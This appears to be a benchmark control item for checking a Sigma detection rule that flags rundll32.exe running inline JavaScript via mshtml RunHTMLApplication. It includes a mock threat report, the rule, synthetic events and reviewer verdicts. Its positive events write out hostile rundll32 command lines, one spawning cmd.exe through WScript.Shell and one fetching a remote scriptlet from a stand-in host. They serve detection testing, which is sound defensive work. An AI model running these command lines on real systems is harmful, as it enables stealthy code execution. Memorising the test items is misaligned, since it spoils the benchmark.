id: CTL1-01
role: control
defect_class: NONE
evasive: false
why: 'Correct rule: valid metadata, tags match T1218.011, every value (rundll32.exe, javascript:, RunHTMLApplication)
  is quoted in the evidence, it uses two selections that must both hold, and it matches only rundll32
  command lines carrying both strings, so benign rundll32 control-panel and printer calls do not match.'
expected_gate: none
report_text: 'During the intrusion at the logistics firm, the operator ran a first-stage script through
  a signed system binary. Telemetry shows rundll32.exe loading mshtml and calling the RunHTMLApplication
  export with an inline script, for example rundll32.exe javascript:\..\mshtml,RunHTMLApplication followed
  by a WScript.Shell Run call. Legitimate use of rundll32.exe never passes a javascript: URI on the command
  line. The same pattern appeared on three workstations within ten minutes, and every instance had Word
  or Explorer as the parent process. Detection should alert on rundll32.exe whose command line carries
  both javascript: and RunHTMLApplication, which keeps the rule specific to this loader.'
evidence:
- Telemetry shows rundll32.exe loading mshtml and calling the RunHTMLApplication export with an inline
  script
- 'Legitimate use of rundll32.exe never passes a javascript: URI on the command line.'
logsource: windows_process_creation
techniques:
- T1218.011
sigma_yaml: |
  title: Rundll32 Executing Inline JavaScript via RunHTMLApplication
  id: 5b0c7a1e-3d42-4f6b-8a91-2c7e4d9f1a01
  status: experimental
  description: 'Detects rundll32.exe calling the mshtml RunHTMLApplication export with an inline javascript: URI to run a script.'
  references:
    - 'urn:atidep:case'
  author: case-author
  date: 2026/10/02
  tags:
    - attack.stealth
    - attack.t1218.011
  logsource:
    category: process_creation
    product: windows
  detection:
    selection_img:
      Image|endswith: '\rundll32.exe'
    selection_cli:
      CommandLine|contains|all:
        - 'javascript:'
        - 'RunHTMLApplication'
    condition: selection_img and selection_cli
  falsepositives:
    - 'No legitimate software is known to pass a javascript: URI to rundll32.exe'
  level: high
assumptions: []
events:
  positive:
  - kind: process_create
    image: C:\Windows\System32\rundll32.exe
    cmd: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject('WScript.Shell');h.Run('cmd.exe
      /c whoami')
    parent: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
    parent_cmd: '"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n'
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\SysWOW64\rundll32.exe
    cmd: rundll32 javascript:"\..\mshtml,runhtmlapplication ";document.write();GetObject('script:http://files.cranemail.test/a.sct')
    parent: C:\Windows\explorer.exe
    parent_cmd: explorer.exe
    user: LAB\bob
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\rundll32.exe
    cmd: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();window.close()
    parent: C:\Windows\explorer.exe
    parent_cmd: explorer.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  negative:
  - kind: process_create
    image: C:\Windows\System32\cmd.exe
    cmd: cmd.exe /c ipconfig /all
    parent: C:\Windows\explorer.exe
    parent_cmd: explorer.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Program Files\Google\Chrome\Application\chrome.exe
    cmd: '"C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory=Default'
    parent: C:\Windows\explorer.exe
    parent_cmd: explorer.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\schtasks.exe
    cmd: schtasks /query /fo LIST
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  lookalike:
  - kind: process_create
    image: C:\Windows\System32\rundll32.exe
    cmd: rundll32.exe shell32.dll,Control_RunDLL desk.cpl
    parent: C:\Windows\explorer.exe
    parent_cmd: explorer.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\rundll32.exe
    cmd: rundll32.exe printui.dll,PrintUIEntry /il
    parent: C:\Windows\explorer.exe
    parent_cmd: explorer.exe
    user: LAB\bob
    dest_ip: null
    dest_port: null
    name: null
tamper_sigma_yaml: ''
review:
  verdicts:
  - reviewer: R2
    role: primary
    verdict: present
    confidence: 90
    reasoning: 'YAML and pySigma parse cleanly and all required keys are present with a valid UUID and
      date. T1218.011 gets attack.stealth and attack.t1218.011, matching the table. The values rundll32.exe,
      javascript: and RunHTMLApplication are covered by the two verbatim evidence quotes, which I confirmed
      in report_text. Fields and modifiers (Image|endswith, CommandLine|contains|all) are within the subset.
      By hand: all three positives match, including the lower-case ''runhtmlapplication'' variant on SysWOW64,
      under case-insensitive matching. The negatives (cmd ipconfig, chrome, schtasks) do not match. The
      look-alikes (rundll32 shell32 Control_RunDLL desk.cpl, and printui.dll) lack javascript: and RunHTMLApplication,
      so they do not match. The baseline has no rundll32 activity of this kind.'
    events_ok: true
    incidental_issues:
    - References is the placeholder 'urn:atidep:case', which the contract allows.
    - Report text says the parent is Word or Explorer, but the rule does not depend on the parent, which
      is fine.
  - reviewer: R4
    role: replacement
    verdict: present
    confidence: 90
    reasoning: 'The YAML parses and pySigma accepts it. All twelve metadata keys are present, status is
      experimental and the id is a valid UUID. The only fields are Image and CommandLine with endswith
      and contains|all on process_creation, and the tags attack.stealth and attack.t1218.011 match the
      table for T1218.011. Both evidence quotations appear word for word in report_text. ''rundll32.exe''
      and ''RunHTMLApplication'' are in quote 1 and ''javascript:'' is in quote 2. By hand, all three
      positives match: each has an image ending in \rundll32.exe (System32 or SysWOW64) and a command
      line containing both javascript: and RunHTMLApplication, with the mixed case in positive 2 matched
      case-insensitively. None of the negatives (cmd ipconfig, chrome, schtasks) or the look-alikes (rundll32
      Control_RunDLL desk.cpl, PrintUIEntry) has javascript:, so none matches. The only alternative has
      an 11-character CommandLine term, and no rundll32 javascript: pattern appears in the baseline summary.'
    events_ok: true
    incidental_issues:
    - Neither look-alike tests one half of the contains|all pair alone (for example rundll32 loading mshtml
      without javascript:), so the AND is not exercised against a near miss.
    - 'Coverage gap that does not violate the case: the mshtml ordinal form (mshtml,#135) and other javascript:
      loaders that do not name RunHTMLApplication are not detected.'
